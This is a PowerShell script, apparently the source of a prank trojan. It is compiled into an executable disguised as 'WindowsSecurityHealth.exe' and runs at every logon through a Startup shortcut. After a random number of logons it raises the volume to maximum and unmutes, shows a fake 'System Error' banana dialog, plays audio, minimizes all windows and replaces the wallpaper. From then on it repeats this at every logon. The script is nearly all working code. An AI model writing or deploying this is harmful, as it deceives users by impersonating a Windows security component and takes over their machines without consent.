# ============================================================
#  payload.ps1  -  compiled into WindowsSecurityHealth.exe
#  Runs on every logon via the Startup shortcut.
#
#  Counter : %TEMP%\startupus.txt
#  Limit   : %TEMP%\startupus_limit.txt   (random 6..15)
#
#  Logic:
#    counter++ each launch
#    if counter < limit  -> exit silently
#    if counter >= limit -> BANANA effect, then counter = limit
#                           (so every next logon triggers again)
# ============================================================

$CacheDir      = Join-Path $env:LOCALAPPDATA "CustomDesktop"
$WallpaperPath = Join-Path $CacheDir "wallpaper.png"
$AudioPath     = Join-Path $CacheDir "sound.mp3"

$CounterFile = Join-Path $env:TEMP "startupus.txt"
$LimitFile   = Join-Path $env:TEMP "startupus_limit.txt"

# --- COUNTER HELPERS ---
function Get-Counter {
    if (Test-Path $CounterFile) {
        try { return [int](Get-Content $CounterFile -Raw).Trim() } catch { return 0 }
    }
    return 0
}
function Set-Counter([int]$v) {
    Set-Content -Path $CounterFile -Value $v -Encoding ASCII
}

# --- Threshold (safety net if installer didn't create it) ---
if (-not (Test-Path $LimitFile)) {
    $rnd = Get-Random -Minimum 6 -Maximum 16
    Set-Content -Path $LimitFile -Value $rnd -Encoding ASCII
}
$Limit = [int](Get-Content $LimitFile -Raw).Trim()

# --- Increment counter ---
$counter = Get-Counter
$counter++
Set-Counter $counter

if ($counter -lt $Limit) {
    # Not yet - exit silently
    exit 0
}

# ============================================================
#  TRIGGER
# ============================================================
# Make it permanent: counter = limit => every next run triggers.
Set-Counter $Limit

# --- PREP: WinAPI helper with unique class name ---
$suffix    = [Guid]::NewGuid().ToString("N").Substring(0,8)
$className = "WinApi_$suffix"

$apiCode = @"
using System;
using System.Runtime.InteropServices;
public class $className {
    [DllImport("user32.dll")]
    public static extern IntPtr GetForegroundWindow();
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}
"@
Add-Type -TypeDefinition $apiCode -ErrorAction Stop
$WinApi = [type]$className

# --- STEP 1: MAX VOLUME 100% + UNMUTE ---
$volSuffix = [Guid]::NewGuid().ToString("N").Substring(0,8)
$volClass  = "AudioCtl_$volSuffix"

$volCode = @"
using System;
using System.Runtime.InteropServices;

[Guid("5CDF2C82-841E-4546-9722-0CF74078229A"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IAudioEndpointVolume {
    int f(); int g(); int h(); int i();
    int SetMasterVolumeLevelScalar(float fLevel, Guid pguidEventContext);
    int j();
    int GetMasterVolumeLevelScalar(out float pfLevel);
    int k(); int l(); int m(); int n();
    int SetMute(bool bMute, Guid pguidEventContext);
    int GetMute(out bool pbMute);
}
[Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IMMDevice {
    int Activate(ref Guid id, int clsCtx, IntPtr activationParams, out IAudioEndpointVolume aev);
}
[Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IMMDeviceEnumerator {
    int f();
    int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice endpoint);
}
[ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")]
class MMDeviceEnumeratorComObject { }

public class $volClass {
    static IAudioEndpointVolume Vol() {
        var enumerator = new MMDeviceEnumeratorComObject() as IMMDeviceEnumerator;
        IMMDevice dev = null;
        Marshal.ThrowExceptionForHR(enumerator.GetDefaultAudioEndpoint(0, 1, out dev));
        IAudioEndpointVolume epv = null;
        var epvid = typeof(IAudioEndpointVolume).GUID;
        Marshal.ThrowExceptionForHR(dev.Activate(ref epvid, 23, IntPtr.Zero, out epv));
        return epv;
    }
    public static void SetVolume(float level) {
        Marshal.ThrowExceptionForHR(Vol().SetMasterVolumeLevelScalar(level, Guid.Empty));
    }
    public static void Unmute() {
        Marshal.ThrowExceptionForHR(Vol().SetMute(false, Guid.Empty));
    }
}
"@
Add-Type -TypeDefinition $volCode -ErrorAction Stop
$AudioCtl = [type]$volClass

try {
    $AudioCtl::Unmute()
    $AudioCtl::SetVolume(1.0)
    Start-Sleep -Milliseconds 200
} catch {
    # Fallback: press Volume Up 60 times
    try {
        $wsh = New-Object -ComObject WScript.Shell
        for ($i = 0; $i -lt 60; $i++) { $wsh.SendKeys([char]175) }
    } catch {}
}

# --- STEP 2: NON-BLOCKING ERROR DIALOG ---
$dialogScript = {
    Add-Type -AssemblyName System.Windows.Forms
    [System.Windows.Forms.MessageBox]::Show(
        "ADIN BANAN BIL OBNARYZEN V VASHEM PC!",
        "System Error",
        [System.Windows.Forms.MessageBoxButtons]::OK,
        [System.Windows.Forms.MessageBoxIcon]::Error
    ) | Out-Null
}
Start-Job -ScriptBlock $dialogScript | Out-Null
Start-Sleep -Milliseconds 300

# --- STEP 3: PLAY AUDIO VIA WMP ---
$wmp64 = Join-Path $env:ProgramFiles "Windows Media Player\wmplayer.exe"
$wmp32 = Join-Path ${env:ProgramFiles(x86)} "Windows Media Player\wmplayer.exe"

$wmp = $null
if (Test-Path $wmp64) { $wmp = $wmp64 }
elseif (Test-Path $wmp32) { $wmp = $wmp32 }

if ($wmp) {
    $proc = Start-Process -FilePath $wmp -ArgumentList "`"$AudioPath`"" -PassThru
} else {
    $proc = Start-Process -FilePath $AudioPath -PassThru
}

# --- STEP 4: MINIMIZE WMP WINDOW ---
Start-Sleep -Milliseconds 600
if ($proc -and -not $proc.HasExited) {
    $proc.Refresh()
    $hwnd = $proc.MainWindowHandle
    if ($hwnd -eq [IntPtr]::Zero) { $hwnd = $WinApi::GetForegroundWindow() }
    if ($hwnd -ne [IntPtr]::Zero) {
        $WinApi::ShowWindow($hwnd, 6) | Out-Null
    }
}

# --- STEP 5: MINIMIZE ALL WINDOWS ---
try {
    $shell = New-Object -ComObject Shell.Application
    $shell.MinimizeAll()
} catch {}
Start-Sleep -Milliseconds 500

# --- STEP 6: SET BANANA AS WALLPAPER ---
$WinApi::SystemParametersInfo(0x0014, 0, $WallpaperPath, 0x01 -bor 0x02) | Out-Null

# --- CLEANUP ---
Get-Job | Remove-Job -Force -ErrorAction SilentlyContinue